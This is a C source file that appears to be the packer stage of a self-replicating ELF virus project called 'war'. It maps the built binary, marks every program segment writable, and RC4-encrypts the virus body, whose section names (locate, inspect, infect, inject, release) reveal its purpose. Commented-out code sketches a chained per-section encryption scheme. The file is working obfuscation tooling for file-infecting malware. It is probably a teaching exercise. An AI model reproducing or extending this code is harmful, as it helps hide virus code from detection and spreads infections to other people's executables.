#include "war.h"
#include <string.h>

#define START_ADDR		0x1227
#define OPENING_ADDR	0x1371
#define WAR_ADDR		0x182b
#define LOCATE_ADDR		0x1a27
#define INSPECT_ADDR	0x1e3a
#define INFECT_ADDR		0x2108
#define INJECT_ADDR		0x246b
#define RELEASE_ADDR	0x28fb
#define CYPHEREND_ADDR	0x29f7
#define END_ADDR		0x2aa8
#define ENDOFDATA_ADDR	0x3364

#define START_SIZE		OPENING_ADDR - START_ADDR
#define OPENING_SIZE	WAR_ADDR - OPENING_ADDR
#define WAR_SIZE		LOCATE_ADDR - WAR_ADDR
#define LOCATE_SIZE		INSPECT_ADDR - LOCATE_ADDR
#define INSPECT_SIZE	INFECT_ADDR - INSPECT_ADDR
#define INFECT_SIZE		INJECT_ADDR - INFECT_ADDR
#define INJECT_SIZE		RELEASE_ADDR - INJECT_ADDR
#define RELEASE_SIZE	CYPHEREND_ADDR - RELEASE_ADDR
#define CYPHEREND_SIZE	END_ADDR - CYPHEREND_ADDR

// _rc4
#define ENCRYPT_END		0x2d90
#define PACKER_SIZE		ENCRYPT_END - OPENING_ADDR

char *ptr;

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void segment_write(char *ptr)
{
	Elf64_Ehdr	*header = ( Elf64_Ehdr *)ptr;
	Elf64_Phdr	*segment;

	for (Elf64_Half index = 0; index < header->e_phnum; index++)
	{
		segment = (Elf64_Phdr *)((void *)ptr + sizeof(Elf64_Ehdr) + (sizeof(Elf64_Phdr) * index));
		segment->p_flags |= PF_W;
	}
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

int main(void)
{
	int			fd;
	char		*filename = "./war";
	t_key		keychain = {0};
	uint8_t		pack_key[KEY_SIZE];
	struct stat	statbuf;

	if ((fd = open(filename, O_RDWR)) < 0)
	{
		perror("open");
		exit(0);
	}

	if (stat(filename, &statbuf) < 0)
	{
		perror("stat");
		exit(0);
	}

	if ((ptr = mmap(NULL, statbuf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == NULL)
	{
		perror("mmap");
		exit(0);
	}

	// moer encrypt
	memcpy(pack_key, ptr + ENCRYPT_END, KEY_SIZE);

	// write permission
	segment_write(ptr);

	/* update_two(&keychain, ptr + RELEASE_ADDR, RELEASE_SIZE); */
	/* revert_two(&keychain, ptr + CYPHEREND_ADDR, CYPHEREND_SIZE); */
	/* printf("cypher_end: start at [%p] size : %d key = %lx\n", ptr + CYPHEREND_ADDR, CYPHEREND_SIZE, keychain.two); */


	/* update_one(&keychain, ptr + INJECT_ADDR, INJECT_SIZE); */
	/* revert_one(&keychain, ptr + RELEASE_ADDR, RELEASE_SIZE); */
	/* printf("release: start at [%p] size : %d key = %lx\n", ptr + RELEASE_ADDR, RELEASE_SIZE, keychain.one); */


	/* update_two(&keychain, ptr + INFECT_ADDR, INFECT_SIZE); */
	/* revert_two(&keychain, ptr + INJECT_ADDR, INJECT_SIZE); */
	/* printf("inject: start at [%p] size : %d key = %lx\n", ptr + INJECT_ADDR, INJECT_SIZE, keychain.two); */


	/* update_one(&keychain, ptr + INSPECT_ADDR, INSPECT_SIZE); */
	/* revert_one(&keychain, ptr + INFECT_ADDR, INFECT_SIZE); */
	/* printf("infect: start at [%p] size : %d key = %lx\n", ptr + INFECT_ADDR, INFECT_SIZE, keychain.one); */


	/* update_two(&keychain, ptr + LOCATE_ADDR, LOCATE_SIZE); */
	/* revert_two(&keychain, ptr + INSPECT_ADDR, INSPECT_SIZE); */
	/* printf("inspect : start at [%p] size : %d : key = %lx \n", ptr + INSPECT_ADDR, INSPECT_SIZE, keychain.two); */


	/* update_one(&keychain, ptr + WAR_ADDR, WAR_SIZE); */
	/* revert_one(&keychain, ptr + LOCATE_ADDR, LOCATE_SIZE); */
	/* printf("locate : start at [%p] size : %d : key = %lx\n", ptr + LOCATE_ADDR, LOCATE_SIZE, keychain.one); */


	/* update_two(&keychain, ptr + OPENING_ADDR, OPENING_SIZE); */
	/* revert_two(&keychain, ptr + WAR_ADDR, WAR_SIZE); */
	/* printf("war : start at [%p] size : %d key = %lx\n", ptr + WAR_ADDR, WAR_SIZE, keychain.two); */


	/* update_one(&keychain, ptr + START_ADDR, START_SIZE); */
	/* revert_one(&keychain, ptr + OPENING_ADDR, OPENING_SIZE); */
	/* printf("opening : start at [%p] size : %d key = %lx\n", ptr + OPENING_ADDR, OPENING_SIZE, keychain.one); */

	(void)keychain;
	// moar encrypt
	_rc4(pack_key, KEY_SIZE, (uint8_t*)ptr + OPENING_ADDR, PACKER_SIZE);
	printf("packer : key:\t%16s\n", pack_key);

	write(fd, ptr, statbuf.st_size);
	munmap(ptr, statbuf.st_size);
	close(fd);
}
